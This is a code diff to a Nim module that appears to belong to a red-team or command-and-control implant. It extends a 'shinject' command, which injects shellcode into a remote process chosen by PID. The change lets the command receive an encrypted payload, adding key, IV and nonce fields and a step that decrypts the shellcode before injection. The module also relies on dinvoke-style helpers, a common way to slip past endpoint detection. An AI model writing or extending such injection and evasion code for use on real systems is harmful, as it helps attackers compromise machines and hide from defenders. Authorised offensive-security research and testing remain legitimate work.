@@ -3,12 +3,17 @@ import json
 when defined(windows):
   import base64
   import winim/lean
-  import ../utils/[delegates, dinvoke]
+  import ../utils/[delegates, dinvoke, crypto]
+  import strutils
   
   type
     ShinjectArgs = object
       pid: int
       uuid: string
+      encryption: string
+      key: string
+      iv: string
+      nonce: string
 
 const CHUNK_SIZE = 512000
 
@@ -68,8 +73,20 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
           }
         }
       
-      # All chunks received - perform injection
       var output = "Injecting shellcode into remote process with PID " & $args.pid & "...\n"
+
+      if args.encryption != "" and args.encryption != "none":
+        output.add("[*] Decrypting shellcode with " & args.encryption & "...\n")
+        try:
+          decryptPayload(fileData, args.encryption, args.key, args.iv, args.nonce)
+          output.add("[+] Decryption successful (" & $fileData.len & " bytes)\n")
+        except Exception as e:
+          return %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": output & "[-] Decryption failed: " & e.msg
+          }
       
       let currProcess = GetCurrentProcessId()
       var
